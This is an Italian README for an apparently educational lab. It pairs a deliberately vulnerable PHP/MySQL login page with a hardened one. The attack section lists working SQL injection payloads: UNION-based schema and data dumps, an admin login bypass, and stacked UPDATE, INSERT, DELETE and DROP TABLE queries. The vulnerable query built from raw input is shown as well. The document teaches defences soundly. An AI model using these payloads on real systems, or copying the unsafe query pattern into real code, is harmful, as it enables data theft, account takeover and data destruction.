# SQL Injection
Progetto sulla realizzazione di una semplice pagina web di login vulnerabile ad attacchi di tipo SQL Injection (SQLi).  
L'obiettivo è riuscire a recuperare o modificare, tramite comandi SQL, le informazioni del DB (anche non conoscendo in anticipo la struttura del DB), violando le tre proprietà CIA e poi implementare delle difese per bloccare questi attacchi.  
Il progetto si divide in due parti: una pagina web (e relative tabelle di DB) priva di difese e una con le difese attive. 

## Tecnologie Usate
* Frontend: HTML, CSS e Javascript per la gestione dell'interfaccia utente
* Backend: PHP per la comunicazione al DB tramite query SQL
* Database: MySQL avviato separatamente e inizializzato con il file "create_db.sql"

## Requisiti e Avvio
**Requisiti per il funzionamento**:
* Docker: per l'esecuzione dei container PHP e MySQL
* Docker-Compose: per avviare facilmente i componenti del progetto
---
**Per avviare l'applicazione bisogna**:
* Avviare Docker
* Entrare con il terminale nella cartella contenente il file docker-compose.yml (non "src")
* Eseguire il comando `docker-compose up -d --build` e aspettare che finisca di avviare i vari componenti 
* Accedere da browser all'indirizzo:
    * http://localhost:8080/unsecure.php per la pagina web **priva di difese**
    * http://localhost:8080/secure.php per la pagina web con le **difese attive**

(oppure se si usa un IDE come VS Code è possibile avviare il container facendo click con il tasto destro sul file docker-compose.yml e selezionare "Compose Up")  
Nel caso in cui il container sia già stato avviato ma si vuole riavviare per resettare il DB o altro usare il comando `docker-compose down -v && docker-compose up -d`

**ATTENZIONE**: il DB ci mette circa 20 secondi ad avviarsi quindi in quel periodo, provando a fare l'accesso dalla pagina web, verrà restituito l'errore "DB Offline"

## Funzionamento
L'utente interagisce tramite un form sulla pagina web che richiede username e password per l'accesso al sito (è solo un form finto per far vedere gli attacchi di SQLi).

Inserendo i dati e facendo l'accesso il browser invia una richiesta GET alla stessa pagina allegando i parametri nell'url   
Es sul sito insicuro: http://localhost:8080/unsecure.php?username=xxx&password=yyy
Questi due parametri vengono poi recuperati e vengono usati per effettuare la richiesta al DB e recuperare l'utente

## Sito Indifeso
Sul sito indifeso la richiesta per recuperare l'utente è semplicemente un SELECT non sicuro inviando username e password così come li ha inseriti l'utente

```SQL
SELECT * FROM unsecure_users WHERE username = '$username' AND password = '$password'
```
Questa query viene poi eseguita usando l'utente root (con tutti i permessi) e tramite la funzione multi_query() che consente l'esecuzione di più query insieme. Poichè non c'è alcun controllo o sanificazione dei dati di input, il sistema è estremamente vulnerabile ad attacchi di tipo SQL

### Invio Automatico dei Payload
Per gli attacchi che andremo a descrivere abbiamo utilizzato uno script (`sql_injection.php`) che esegue automaticamente questi attacchi stampando a terminale l'eventuale risposta della pagina web. È infatti possibile usare gli stessi payload manualmente tramite il form nell'interfaccia web.  
È possibile eseguire lo script da terminale eseguendo questo comando nella cartella del progetto:  
    `php sql_injection.php`  
(è necessario installare in precedenza PHP sull'OS)

### Possibili Attacchi SQL Injection
Possibili attacchi di tipo SQL Injection che un attaccante può eseguire:
* **Scoprire il DB** (**Confidenzialità violata**): conoscere le varie tabelle del DB
    * Il comando tautologia
        ```
        ' OR 1=1
        ``` 
        è il modo più veloce per scoprire le informazioni della tabella usata per il login
    * Con il comando 
        ```
        ' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema = DATABASE()-- -
        ```
        effettuiamo un UNION SELECT sulla tabella `information_schema.tables` che contiene tutte le tabelle del DB per **scoprire i nomi delle tabelle**
* **Esfiltrare i dati contenuti nelle tabelle** (**Confidenzialità violata**): Ora che sappiamo i nomi delle tabelle, per capire la struttura delle tabelle trovate possiamo usare:
    * Con i comandi
        ```
        ' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='users' AND table_schema=DATABASE()-- -
        ```
        ```
        ' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='contacts' AND table_schema=DATABASE()-- -
        ```
        possiamo **trovare i nomi delle colonne delle tabelle users e contacts**
    * Ora che sappiamo i nomi delle colonne delle varie tabelle, con i comandi
        ```
        ' UNION SELECT id, username, password FROM users-- -
        ```
        ```
        ' UNION SELECT user_id, telefono, email FROM contacts-- -
        ```
        possiamo **stampare i dati delle tabelle users e contacts**
    * Vedendo che esiste l'account "admin" possiamo usare il comando
        ```
        admin' -- 
        ```
        per effettuare **l'accesso con l'account "admin" senza il bisogno della password**
* **Modificare il contenuto del DB** (**Integrità violata**): possiamo provare a modificare il contenuto delle tabelle, ad esempio:
    * Modificando le informazioni di un account:
        ```
        '; UPDATE unsecure_users SET password='123456' WHERE username='anna.neri'; SELECT * FROM unsecure_users; -- 
        ```
        In questo modo abbiamo **modificato la password dell'utente "anna.neri"** in "123456"
    * Aggiungendo un nuovo utente direttamente dal DB:
        ```
        '; INSERT INTO unsecure_users (username, password) VALUES ('testuser', 'test1234!'); SELECT * FROM unsecure_users; --
        ```
        **Creando così un nuovo utente "testuser"**
        Potremmo anche inserire quanti profili vogliamo a piacimento e magari anche modificare i permessi dell'utente creato dandogli quelli di root
* **Cancellare una o più tabelle e il loro contenuto** (**Disponibilità e Integrità violata**):
    * Con il comando
        ```
        '; DELETE FROM users WHERE username='mario.rossi'; SELECT * FROM users; --
        ```
        possiamo vedere come abbiamo **eliminato l'utente "mario.rossi"** e le sue informazioni e dati dal DB, obbligandolo a ricreare l'account da capo la prossima volta che deve accedere.
    * Visto che abbiamo i permessi per eliminare le singole righe, proviamo anche a eliminare le tabelle. Con il comando
        ```
        '; DROP TABLE contacts; DROP TABLE users; --
        ```
        possiamo **eliminare le intere tabelle users e contacts** con i loro relativi dati. Quindi gli utenti (admin compreso) avranno perso tutte le loro informazioni 

Tutti gli attacchi eseguiti utilizzano il carattere `'` per chiudere il primo parametro nella query (`'$username'` nel nostro caso), inseriscono l'eventuale query da effettuare al DB (SELECT, INSERT, DROP TABLE, ecc) e poi i caratteri `--` che rappresentano il commento SQL, saltando così il resto della query originale (quindi `AND password = '$password'`) 


## Sito Difeso
Per ridurre le vulnerabilità di SQL Injection abbiamo adottato un approccio più sicuro nella gestione delle query e nella protezione della disponibilità e confidenzialità del DB.

### Difese a livello di Query
Per rendere più sicure le interrogazioni al DB abbiamo:
* Rimosso la possibilità di concatenare più query in una sola richiesta (**Piggybacking**). Rimuovendo la funzione "multi_query()", che permette di inviare varie query al DB separati dal carattere ";", abbiamo rimosso la possibilità di effettuare attacchi come `UPDATE`, `INSERT`, `DELETE` e `DROP TABLE`
* Utilizzato le **Query Parametrizzate**, trattando i parametri come stringhe semplici inseriti in un secondo momento, separando così la struttura della query SQL dall'input dell'utente, qualunque esso sia.  
In questo modo risolviamo tutte le iniezioni classiche di primo ordine, cosi che l'attaccante non possa eseguire nessuna iniezione direttamente dal form.

### Difese a livello di DB
Per proteggere la disponibilità e la confidenzialità del DB abbiamo:
* Eseguito l'**hashing delle password** facendo in modo che, se eventualmente un attaccante riesce in qualche modo ad accedere alla lista degli utenti, non abbia modo di vedere in modo chiaro le varie password
* Usato il principio del "**Least Privilege**" per eseguire le chiamate al DB. Creando un utente del DB con i permessi solo per leggere, inserire, aggiornare e eliminare singole righe un attaccante può semplicemente eseguire comandi basici senza alterare le intere tabelle (es DROP TABLE)

### Ulteriore Difese non utilizzate
Abbiamo anche pensato ad altre difese possibili che però non sono state implementate poichè limitavano l'esperienza dell'utente o perchè non utili al nostro progetto:
* **Limitare i tentativi di accesso** (ad esempio massimo 5 tentativi ogni ora) cosi che un attaccante non possa tentare troppe volte l'accesso al sito.
Però ha piu senso contro attacchi di bruteforce o se implementato tramite il controllo degli IP, che ovviamente nel nostro progetto d'esempio non si può fare poichè siamo sulla stessa macchina.
* **Rimozione di caratteri come `'` o `--`**: in questo modo avremmo risolto le query classiche che usano questi caratteri per eseguire l'SQL Injection.  
Però limita la creazione delle password per gli utenti e comunque gli attaccanti possono bypassare questo filtro usando magari il codice esadecimale (%27) del carattere

## Conclusioni
La maggior parte degli attacchi di tipo SQL Injection è causata principalmente da pratiche di programmazione insicure, che quindi possono essere mitigate semplicemente applicando i principi chiave della programmazione difensiva.   
Siccome questo tipo di attacchi sono vari, facili da eseguire e molto pericolosi, è necessario implementare molteplici contromisure con un approccio a più livelli, unendo la scrittura di codice sicuro (es. l'uso delle query parametrizzate) a una configurazione rigorsa del DB (es. applicando il principio del least privilege).  
In definitivà, solo affiancando queste molteplci difese dall'inizio del ciclo di vita del software possiamo efficacemente proteggere le proprietà CIA dei nostri sistemi.